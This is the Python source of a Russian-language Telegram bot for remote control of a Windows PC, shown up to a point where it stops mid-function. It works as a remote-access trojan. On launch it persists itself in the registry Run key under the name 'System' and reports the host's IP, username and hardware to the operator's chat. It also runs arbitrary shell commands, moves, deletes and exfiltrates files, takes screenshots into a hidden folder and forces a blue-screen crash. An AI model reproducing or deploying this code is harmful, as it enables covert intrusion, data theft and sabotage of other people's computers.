import telebot
import os
import datetime
import webbrowser
import shutil
import pyautogui
import subprocess
import http.client
import ctypes
import ctypes.wintypes
import configparser
import winreg
import keyboard
import pygetwindow
import platform

from winreg import *
from telebot import types

config = configparser.ConfigParser()
config.read("settings.ini")

#Настройки бота
chat_id = int(config["Main"]["first_id"])  #1 Доступ
chat_idd = int(config["Main"]["second_id"]) #2 Доступ
bot = telebot.TeleBot(config["Main"]["token"], parse_mode=None) #Токен
samp_route = config["SAMP"]["gtasa_route"]
raklite_route = config["SAMP"]["raklite_route"]

#Троллинг
pyautogui.FAILSAFE = False
zagl = ""

#///////////////////////////////////////////////
conn = http.client.HTTPConnection("ifconfig.me")
conn.request("GET", "/ip")

#Для функций
name = ""
route = ""

total_mem, used_mem, free_mem = shutil.disk_usage('.')
gb = 10 ** 9
login = os.getlogin()
width, height = pyautogui.size()
ip = conn.getresponse().read()

#добавить
oper = platform.uname()



def set_autostart_registry(app_name, key_data = None, autostart: bool = True):
    with winreg.OpenKey(
        key=winreg.HKEY_CURRENT_USER,
        sub_key=r'Software\Microsoft\Windows\CurrentVersion\Run',
        reserved=0,
        access=winreg.KEY_ALL_ACCESS) as key:
        try:
            if autostart:
                winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, key_data)
            
            else:
                winreg.DeleteValue(key, app_name)
        
        except OSError:
            return False
        
        return True

set_autostart_registry(app_name='System', key_data=os.path.abspath(__file__))

zapusk = datetime.datetime.now()
bot.send_message(chat_id, f'🧐 Бот был где-то запущен! \n\n⏰ Точное время запуска: *{zapusk}*\n💾 Имя пользователя - *{login}*\n🪑 Операционная система - *{oper[0]} {oper[2]} {oper[3]}*\n🧮 Процессор - *{oper[5]}*\n🔑 IP адрес запустившего - *' + str(ip)[2:-1] + f'*\n🖥 Разрешение экрана - *{width}x{height}*\n📀 Память: ' + '*{:6.2f}* ГБ'.format(total_mem/gb) + " всего, осталось *{:6.2f}* ГБ".format(free_mem/gb), parse_mode="Markdown")
print(str(zapusk) + "|" + " Управление компом v. 1.0 успешно запущено!")
        


@bot.message_handler(commands=['start'])
def start(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        mainmenu(message)
        return



def samp_connect(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        ip = message.text.strip()

        if ip == '/start':
            return start()

        try:
            bot.send_message(message.chat.id, f'☑️ Подключаемся к серверу с IP *{ip}*...', parse_mode = "Markdown")
            samp_menu(message)
            os.system(f'{samp_route}\samp.exe {ip}')
        
        except:
            bot.send_message(message.chat.id, '❌ Произошла ошибка!! Проверьте ваш settings.ini', parse_mode = "Markdown")
            samp_menu(message)
            return



def raklite_connect(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        try:
            if message.text.strip() == '/start':
                return start(message)

            info = message.text.strip().split(',') # ник,ip,port

            if len(info) != 3:
                bot.send_message(message.chat.id, '*❌ Вы не дописали все аргументы! Проверьте ваше сообщение и повторите попытку позже*', parse_mode = "Markdown")
                return samp_menu(message)

            bot.send_message(message.chat.id, f'☑️ Подключаемся к *{info[1]}:{info[2]}*', parse_mode = "Markdown")
            samp_menu(message)
            os.system(f'"{raklite_route}\RakSAMP Lite.exe" -n {info[0]} -h {info[1]} -p {info[2]} -z')

        except:
            bot.send_message(message.chat.id, '❌ Произошла ошибка!! Проверьте ваш settings.ini', parse_mode = "Markdown")
            return samp_menu(message)


def powershell_cmd(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        cmd = message.text.strip()
        if str(cmd) == 'Назад':
            console_menu(message)

        elif str(cmd) == '/start':
            start(message)

        else:
            os.system('chcp 1251')
            try:
                output=subprocess.getoutput(cmd)                    

                if len(output) > 3999:
                    if os.path.exists('C:\\temp\\') == False:
                        fileName = r'C:\temp'
                        os.mkdir(fileName)
                        kernel32 = ctypes.windll.kernel32
                        attr = kernel32.GetFileAttributesW(fileName)
                        kernel32.SetFileAttributesW(fileName, attr | 2)

                    bot.send_message(message.chat.id, f'☑️ Команда *{cmd}* успешно выполнена\n\nОтвет от консоли оказался *слишком длинным* и был *сохранен в файл ниже*!', parse_mode = "Markdown")
                    my_file = open("C:\\temp\\ConsoleOutput.txt", "w", encoding="utf-8")
                    my_file.write(output)
                    my_file.close()
                    bot.send_document(message.chat.id, document = open('C:\\temp\\ConsoleOutput.txt', 'rb'))
                    os.remove('C:\\temp\\ConsoleOutput.txt')
                    return bot.register_next_step_handler(message, powershell_cmd)

                bot.send_message(message.chat.id, f'*{output}*', parse_mode = "Markdown")
                bot.send_message(message.chat.id, f'☑️ Команда *{cmd}* успешно выполнена\n\nОтвет от консоли выше', parse_mode = "Markdown")
                bot.register_next_step_handler(message, powershell_cmd)

            except:
                bot.send_message(message.chat.id, f'☑️ Команда *{cmd}* успешно выполнена\n\nОтвет от консоли оказался *пустой строкой*!', parse_mode = "Markdown")
                return bot.register_next_step_handler(message, powershell_cmd)





def python_scripts(message):
    script_route = message.text.strip()

    if script_route == '/start':
        return start(message)
    
    bot.send_message(message.chat.id, f'☑️ *Python скрипт по пути "{script_route}" был запущен!*', parse_mode = "Markdown")
    console_menu(message)

    try:
        os.system('chcp 1251')
        output=subprocess.getoutput(f'python {script_route}')

        bot.send_message(message.chat.id, f'☑️ *Python скрипт по пути "{script_route}" был успешно выполнен!\nЛог ниже*', parse_mode = "Markdown")
        bot.send_message(message.chat.id, f'*{output}*', parse_mode = "Markdown")

    except:
        bot.send_message(message.chat.id, f'❌ *Python скрипт по пути {script_route} не был запущен из-за ошибки!*', parse_mode = "Markdown")





def bsod(message):
    if message.text.strip() == 'Да, конечно':
        bot.send_message(message.chat.id, f'☑️ *Вы успешно вызвали BSOD!*', parse_mode = "Markdown")
        subprocess.call("cd C:\:$i30:$bitmap", shell=True)
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))

    elif message.text.strip() == '/start':
        start(message)

    elif message.text.strip() == 'Нет, я передумал':
        bot.send_message(message.chat.id, f'☑️ *Вы успешно отменили BSOD!*', parse_mode = "Markdown")
        other_functions(message)

    else:
        bot.send_message(message.chat.id, '❌ Ошибка: *неизвестный ответ*!', parse_mode="Markdown")
        other_functions(message)





def sozd_file(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        global name

        name = message.text.strip()
        if str(name) == '/start':
            start(message)

        elif str(name) == 'Назад':
            files(message)
        
        else:
            try:
                my_file = open(str(name), "w")
                my_file.close()
                bot.send_message(message.chat.id, '✍️ *Введите содержимое файла!*', parse_mode='Markdown')
                bot.register_next_step_handler(message, sozd_file2)

            except:
                bot.send_message(message.chat.id, '❌ Ошибка: *нет доступа или не хватает места*', parse_mode="Markdown")
                files(message)

def sozd_file2(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        global name
        sod = message.text.strip()
        
        if str(sod) == '/start':
            start(message)

        else:
            my_file = open(str(name), "a+", encoding='utf-8')
            my_file.write(str(sod))
            my_file.close()
            bot.send_message(message.chat.id, f'☑️ Файл *{name}* успешно создан!', parse_mode="Markdown")
            files(message)





def change_file(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Добавить содержимое")
        item1=types.KeyboardButton("Полностью изменить содержимое")
        item2=types.KeyboardButton("Очистить файл")
        item3=types.KeyboardButton("Назад")
        markup.add(item0)
        markup.add(item1)
        markup.add(item2)
        markup.add(item3)
        bot.send_message(message.chat.id, '*✍️ Выберите действие!*', reply_markup=markup, parse_mode="Markdown")
        bot.register_next_step_handler(message, change_file1)
    
def change_file1(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == 'Назад':
            files(message)

        elif message.text.strip() == "Добавить содержимое":
            dobvka_file(message)

        elif message.text.strip() == "Очистить файл":
            ochistka(message)

        elif message.text.strip() == "Полностью изменить содержимое":
            izmena(message)

        elif message.text.strip() == '/start':
            start(message)

        else:
            bot.send_message(message.chat.id, '❌ *Неверный выбор!* Повторите попытку', parse_mode="Markdown")
            change_file(message)





def izmena(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        bot.send_message(message.chat.id, '✍️ *Укажите путь до файла(если файл находятся в исполняемой папке, просто напишите название)*', parse_mode="Markdown")
        bot.register_next_step_handler(message, izmena_2)

def izmena_2(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        global route

        route = message.text.strip()
        if str(route) == '/start':
            start(message)

        else:   
            bot.send_message(message.chat.id, '✍️ *Укажите новое содержимое!*', parse_mode="Markdown")
            bot.register_next_step_handler(message, izmena_3)

def izmena_3(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        try:
            new_sod = message.text.strip()
            if str(new_sod) == '/start':
                start(message)

            else:
                f = open(str(route),'w',encoding = 'utf-8')
                f.write(str(new_sod))
                f.close
                bot.send_message(message.chat.id, f'☑️ Файл *{route}* был успешно изменен!', parse_mode="Markdown")
                mainmenu(message)

        except:
                bot.send_message(message.chat.id, '❌ Ошибка: *нет доступа или файл не существует!*', parse_mode="Markdown")
                change_file(message)





def ochistka(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        bot.send_message(message.chat.id, '✍️ *Укажите путь до файла(если файл находятся в исполняемой папке, просто напишите название)*', parse_mode="Markdown")
        bot.register_next_step_handler(message, check_ochistka)

def check_ochistka(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        route = message.text.strip()
        
        if str(route) == '/start':
            start(message)

        else:
            try:
                f = open(str(route),'w+',encoding = 'utf-8')
                f.write("")
                f.close
                bot.send_message(message.chat.id, f'☑️ Файл *{route}* был успешно очищен!', parse_mode='Markdown')
                mainmenu(message)

            except:
                bot.send_message(message.chat.id, '❌ Ошибка: *нет доступа или файла не существует*', parse_mode='Markdown')
                change_file(message)





def dobvka_file(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        bot.send_message(message.chat.id, '✍️ *Введите название файла с расширением или путь до нужного файла*', parse_mode='Markdown')
        bot.register_next_step_handler(message, dobavka_put)

def dobavka_put(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == '/start':
                start(message)

        else:
            global route
            route = message.text.strip()
            bot.send_message(message.chat.id, '✍️ *Укажите, что нужно добавить!*', parse_mode='Markdown')
            bot.register_next_step_handler(message, dobavka_final)

def dobavka_final(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == '/start':
                start(message)

        else:
            try:
                global route
                sod = message.text.strip()

                my_file = open(str(route), "a+")
                my_file.write(str(route))
                my_file.close()
                bot.send_message(message.chat.id, f'☑️ Файл *{route}* успешно создан/изменен!', parse_mode='Markdown')

                files(message)

            except:
                bot.send_message(message.chat.id, '❌ Ошибка: *нет доступа или файла не существует!*', parse_mode='Markdown')
                change_file(message)





def delete_file5545(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item2=types.KeyboardButton("Удалить файл")
        item3=types.KeyboardButton("Удалить папку")
        item1=types.KeyboardButton("Назад")
        markup.add(item2)
        markup.add(item3)
        markup.add(item1)
        bot.send_message(message.chat.id, '✍️ *Выберите то, что необходимо*', reply_markup=markup, parse_mode='Markdown')
        bot.register_next_step_handler(message, check_delete)

def check_delete(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == 'Удалить папку':
            delete_papka(message)

        elif message.text.strip() == 'Удалить файл':
            delete_filee(message)

        elif message.text.strip() == '/start':
                start(message)

        elif message.text.strip() == 'Назад':
            files(message)





def delete_filee(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        bot.send_message(message.chat.id, '*✍️ Введите путь к файлу, который надо удалить (либо просто название файла с расширением, если он в текущей папке)!*', parse_mode='Markdown')
        bot.register_next_step_handler(message, delete_filee1)

def delete_filee1(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        try:
            if message.text.strip() == '/start':
                start(message)

            else:
                putt = message.text.strip()
                os.remove(putt)
                bot.send_message(message.chat.id, f'☑️ Файл по пути *{route}* был успешно удален!', parse_mode = "Markdown")
                delete_file5545(message)

        except:
            bot.send_message(message.chat.id, '❌ Ошибка: *файл не был найден или отсутствует доступ!*\nПовторите попытку позже', parse_mode='Markdown')
            delete_file5545(message)





def delete_papka(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        bot.send_message(message.chat.id, '*✍️ Введите путь к папке, которую надо удалить!*', parse_mode='Markdown')
        bot.register_next_step_handler(message, delete_papka1)

def delete_papka1(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        try:
            if message.text.strip() == '/start':
                start(message)
            else:
                putt = message.text.strip()
                shutil.rmtree(putt)

                bot.send_message(message.chat.id, f'☑️ Папка по пути *{putt}* была удалена!', parse_mode = "Markdown")

                delete_file5545(message)
        
        except:
            bot.send_message(message.chat.id, '❌ Ошибка: *папка не была найдена или к ней отсутствует доступ!*\nПовторите попытку', parse_mode='Markdown')
            delete_file5545(message)





def download_on_pc1(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Выгрузить фото")
        item1=types.KeyboardButton("Выгрузить другое")
        item2=types.KeyboardButton("Назад")
        markup.add(item0)
        markup.add(item1)
        markup.add(item2)

        bot.send_message(message.chat.id, '*⚽️ Вы в меню выгрузки файлов!*', reply_markup=markup, parse_mode="Markdown")
        bot.register_next_step_handler(message, check_download_on_pc)

def check_download_on_pc(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == 'Выгрузить фото':
            bot.send_message(message.chat.id, '*✍️ Введите путь, куда нужно сохранить выгруженное фото\n(Пример: C:\\pon.jpg)*', parse_mode="Markdown")
            bot.register_next_step_handler(message, download_photo)

        elif message.text.strip() == 'Выгрузить другое':
            bot.send_message(message.chat.id, '*✍️ Введите путь, куда нужно сохранить выгруженный файл\n(Пример: C:\\pon.txt)*', parse_mode="Markdown")
            bot.register_next_step_handler(message, download_file_on_pc)

        elif message.text.strip() == 'Назад':
            files(message)

        elif message.text.strip() == '/start':
            start(message)

        else:
            bot.send_message(message.chat.id, '❌ *Неверный выбор!*\nПовторите попытку позже', parse_mode='Markdown')
            download_on_pc1(message)





def download_file_on_pc(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        global route
        route = str(message.text.strip())

        if route == '/start':
            start(message)

        bot.send_message(message.chat.id, '*✍️ Пришлите файл, который необходимо выгрузить (до 20 мб)*', parse_mode="Markdown")
        bot.register_next_step_handler(message, download_file_on_pc1)

def download_file_on_pc1(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        try:
            src = route
            with open(src, 'wb') as new_file:
                new_file.write(downloaded_file)

            bot.send_message(message.chat.id, '*☑️ Успешно сохранено!*', parse_mode="Markdown")
            download_on_pc1(message)

        except:
            bot.send_message(message.chat.id, '*❌ Отказано в доступе, или файл слишком тяжелый, или указаного пути не существует!*', parse_mode="Markdown")
            download_on_pc1(message)





def download_photo(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        global route
        route = str(message.text.strip())

        if route == '/start':
            start(message)

        bot.send_message(message.chat.id, '*✍️ Пришлите файл, который необходимо выгрузить (до 20 мб)*', parse_mode="Markdown")
        bot.register_next_step_handler(message, download_photo1)

def download_photo1(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        file_info = bot.get_file(message.photo[len(message.photo) - 1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        try:
            with open(route, 'wb') as new_file:
                new_file.write(downloaded_file)

            bot.send_message(message.chat.id, '*☑️ Успешно сохранено!*', parse_mode="Markdown")
            download_on_pc1(message)

        except:
            bot.send_message(message.chat.id, '*❌ Отказано в доступе, или файл слишком тяжелый, или указаного пути не существует!*', parse_mode="Markdown")
            download_on_pc1(message)





def files(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Создание файлов/папок")
        item1=types.KeyboardButton("Удаление файлов/папок")
        item2=types.KeyboardButton("Изменение файлов")
        item3=types.KeyboardButton("Запустить файл/программу")
        item4=types.KeyboardButton("Скачать файл с ПК")
        item5=types.KeyboardButton("Выгрузить файл на ПК")
        item6=types.KeyboardButton("Назад")
        markup.add(item0)
        markup.add(item1)
        markup.add(item2)
        markup.add(item3)
        markup.add(item4)
        markup.add(item5)
        markup.add(item6)
        bot.send_message(message.chat.id, '*🗂 Вы в меню файлов!*', reply_markup=markup, parse_mode="Markdown")
        bot.register_next_step_handler(message, check_files)

def check_files(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):  
        if message.text.strip() == 'Создание файлов/папок':
            markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
            item0=types.KeyboardButton("Создать файл")
            item1=types.KeyboardButton("Создать папку")
            item2=types.KeyboardButton("Назад")
            markup.add(item0)
            markup.add(item1)
            markup.add(item2)

            bot.send_message(message.chat.id, '*✍️ Выберите то, что необходимо создать или вернитесь назад!*', reply_markup=markup, parse_mode="Markdown")
            bot.register_next_step_handler(message, check_create)

        elif message.text.strip() == 'Изменение файлов': 
            change_file(message)

        elif message.text.strip() == 'Назад':
            mainmenu(message)

        elif message.text.strip() == 'Удаление файлов/папок':
            delete_file5545(message)

        elif message.text.strip() == '/start':
            start(message)

        elif message.text.strip() == 'Запустить файл/программу':
            markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
            item0=types.KeyboardButton("Назад")
            markup.add(item0)

            bot.send_message(message.chat.id, '*✍️ Введите название и расширение файла(Пример: test.txt), если файл не из этой папки, введите полный путь!*', reply_markup=markup, parse_mode="Markdown")
            bot.register_next_step_handler(message, open_file)

        elif message.text.strip() == 'Скачать файл с ПК':
            markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
            item0=types.KeyboardButton("Назад")
            markup.add(item0)

            bot.send_message(message.chat.id, '*✍️ Введите название и расширение файла(Пример: test.txt), если файл не из этой папки, введите полный путь (до 50 мб)*', reply_markup=markup, parse_mode="Markdown")
            bot.register_next_step_handler(message, download_file)

        elif message.text.strip() == 'Выгрузить файл на ПК':
            download_on_pc1(message)

        else:
            bot.send_message(message.chat.id, '❌ *Неверный выбор!\nПовторите попытку*', parse_mode='Markdown')
            files(message)


def check_create(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == 'Создать файл':
            bot.send_message(message.chat.id, '*✍️ Введите название и расширение файла(Пример: test.txt)!*', parse_mode="Markdown")
            bot.register_next_step_handler(message, sozd_file)

        elif message.text.strip() == 'Создать папку':
            bot.send_message(message.chat.id, '*✍️ Введите путь к новой папке или просто введите ее название, если хотите ее создать в месте, где запущен скрипт\n\n❗️ Пример пути: C:\\Новая папка*', parse_mode="Markdown")
            bot.register_next_step_handler(message, create_folder)

        elif message.text.strip() == 'Назад':
            files(message)

        elif message.text.strip() == '/start':
            start(message)

        else:
            bot.send_message(message.chat.id, '❌ *Неверный выбор!\nПовторите попытку*', parse_mode="Markdown")
            files(message)

def create_folder(message):
    try:
        route = message.text.strip()

        if route == '/start':
            return start(message)

        os.mkdir(str(route))

        bot.send_message(message.chat.id, f'*☑️ Папка по пути "{route}" была успешно создана!*', parse_mode="Markdown")
        return files(message)

    except:
        bot.send_message(message.chat.id, '❌ Ошибка: *нет доступа или не хватает места*', parse_mode="Markdown")
        return files(message)



def download_file(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        try:
            route = message.text.strip()
            
            if route == '/start':
                return start(message)

            elif str(route) == 'Назад':
                return files(message)

            photo = open(str(route), 'rb')
            bot.send_document(message.chat.id, photo)
            files(message)

        except:
            bot.send_message(message.chat.id, '❌ Ошибка: *нет доступа или файл не существует*', parse_mode='Markdown')
            files(message)





def open_file(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        try:
            path = message.text.strip()
            if message.text.strip() == "/start":
                start(message)

            elif str(name) == 'Назад':
                files(message)
            
            else:
                os.startfile(str(path))
                bot.send_message(message.chat.id, f'*☑️ Файл {path} успешно запущен!*', parse_mode="Markdown")
                files(message)

        except:
            bot.send_message(message.chat.id, '❌ *Файл не найден или отсутствует доступ!* Повторите попытку', parse_mode="Markdown")
            files(message)





def create_error(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        global zagl
        zagl = message.text.strip()

        if zagl == '/start':
            return start(message)

        bot.send_message(message.chat.id, '❗️ *Впишите содержимое ошибки!*', parse_mode='Markdown')
        bot.register_next_step_handler(message, create_error2)

def create_error2(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        global zagl
        sod = message.text.strip()

        if sod == '/start':
            return start(message)

        bot.send_message(message.chat.id, '❗️ *Ошибка успешно создана!*', parse_mode='Markdown')
        console_menu(message)
        ctypes.windll.user32.MessageBoxW(0, sod, zagl, 0)





def console_menu(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Ввод команд")
        item1=types.KeyboardButton("Запустить Python скрипт")
        item2=types.KeyboardButton("Сделать скриншот")
        item3=types.KeyboardButton("Открыть сайт")
        item4=types.KeyboardButton("Создать ошибку")
        item5=types.KeyboardButton("Информация о ПК")
        item6=types.KeyboardButton("Назад")
        markup.add(item0)
        markup.add(item1)
        markup.add(item2)
        markup.add(item3)
        markup.add(item4)
        markup.add(item5)
        markup.add(item6)
        bot.send_message(message.chat.id, '💻 *Вы в меню консоли!*', reply_markup=markup, parse_mode='Markdown')
        bot.register_next_step_handler(message, console_check)

def console_check(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == 'Ввод команд': 
            markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
            item0=types.KeyboardButton("tasklist")
            item1=types.KeyboardButton("ping")
            item5=types.KeyboardButton("Назад")
            markup.add(item0)
            markup.add(item1)
            markup.add(item5)
            bot.send_message(message.chat.id, '🖥 *Введите команду для консоли!\n\n❗️ При любых непонятных ситуациях вводите /start*', reply_markup=markup, parse_mode='Markdown')
            bot.register_next_step_handler(message, powershell_cmd)


        elif message.text.strip() == 'Сделать скриншот':
            try:
                if os.path.exists('C:\\temp\\') == False:
                    fileName = r'C:\temp'
                    os.mkdir(fileName)
                    kernel32 = ctypes.windll.kernel32
                    attr = kernel32.GetFileAttributesW(fileName)
                    kernel32.SetFileAttributesW(fileName, attr | 2)

                pyautogui.screenshot('C:\\temp\\screenshot1.png')
                bot.send_document(message.chat.id, open('C:\\temp\\screenshot1.png', 'rb'))
                console_menu(message)

            except PermissionError:
                bot.send_message(message.chat.id, '❌ *У бота недостаточно прав!*', parse_mode='Markdown')
                console_menu(message)

        elif message.text.strip() == 'Информация о ПК':
            active_window = pygetwindow.getActiveWindowTitle()
            if active_window == None or active_window == '':
                active_window = 'Рабочий стол'

            bot.send_message(chat_id, f'⏰ Точное время запуска: *{zapusk}*\n💾 Имя пользователя - *{login}*\n🪑 Операционная система - *{oper[0]} {oper[2]} {oper[3]}*\n🧮 Процессор - *{oper[5]}*\n🔑 IP адрес запустившего - *' + str(ip)[2:-1] + f'*\n🖥 Разрешение экрана - *{width}x{height}*\n📀 Память: ' + '*{:6.2f}* ГБ'.format(total_mem/gb) + " всего, осталось *{:6.2f}* ГБ".format(free_mem/gb) + f"\n*🖼 Активное окно - {active_window}*", parse_mode="Markdown")
            console_menu(message)

        elif message.text.strip() == 'Создать ошибку':
            bot.send_message(message.chat.id, '❗️ *Введите заголовок ошибки!*', parse_mode='Markdown')
            bot.register_next_step_handler(message, create_error)

        elif message.text.strip() == 'Запустить Python скрипт':
            bot.send_message(message.chat.id, '❗️ *Введите путь скрипта!*', parse_mode='Markdown')
            bot.register_next_step_handler(message, python_scripts)

        elif message.text.strip() == 'Открыть сайт':
            markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
            item0=types.KeyboardButton("Назад")
            markup.add(item0)

            bot.send_message(message.chat.id, '✍️ *Введите адрес сайта!*', reply_markup=markup, parse_mode='Markdown')
            bot.register_next_step_handler(message, open_site)


        elif message.text.strip() == 'Назад':
            mainmenu(message)

        elif message.text.strip() == '/start':
            start(message)

        else:
            bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
            console_menu(message)





def open_site(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == 'Назад':
            console_menu(message)

        elif message.text.strip() == '/start':
            start(message)

        else:
            try:
                whatopen = message.text.strip()
                webbrowser.open(str(whatopen), new=1)
                bot.send_message(message.chat.id, f'☑️ *Вы успешно открыли {whatopen}*', parse_mode='Markdown')
                console_menu(message)

            except:
                bot.send_message(message.chat.id, '❌ *Произошла неизвестная ошибка! Попробуйте позже*', parse_mode='Markdown')
                console_menu()



def media_buttons(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Пауза/Старт")
        item1=types.KeyboardButton("Перемотка вперёд")
        item2=types.KeyboardButton("Назад")
        markup.add(item0)
        markup.add(item1)
        markup.add(item2)
        bot.send_message(message.chat.id, '⌨️ *Вы в меню медиа-клавиш!*', reply_markup=markup, parse_mode='Markdown')
        bot.register_next_step_handler(message, mediabuttons_check)


def mediabuttons_check(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == 'Пауза/Старт':
            keyboard.send('play/pause media')
            return media_buttons(message)

        elif message.text.strip() == 'Перемотка вперёд':
            keyboard.send('alt+right')
            return media_buttons(message)

        elif message.text.strip() == '/start':
            return start(message)

        elif message.text.strip() == 'Назад':
            return keyboard_menu(message)

        else:
            return media_buttons(message)





def keyboard_menu(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Напечатать что-то")
        item1=types.KeyboardButton("Нажать клавиши")
        item2=types.KeyboardButton("Медиа-клавиши")
        item3=types.KeyboardButton("Назад")
        markup.add(item0)
        markup.add(item1)
        markup.add(item2)
        markup.add(item3)
        bot.send_message(message.chat.id, '⌨️ *Вы в меню клавиатуры!*', reply_markup=markup, parse_mode='Markdown')
        bot.register_next_step_handler(message, keyboard_check)

def keyboard_check(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == 'Назад':
            mainmenu(message)

        elif message.text.strip() == 'Напечатать что-то':
            keyboard_word(message)

        elif message.text.strip() == 'Нажать клавиши':
            keyboard_keys(message)

        elif message.text.strip() == 'Медиа-клавиши':
            media_buttons(message)

        elif message.text.strip() == '/start':
            start(message)

        else:
            bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
            keyboard_menu(message)





def keyboard_word(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
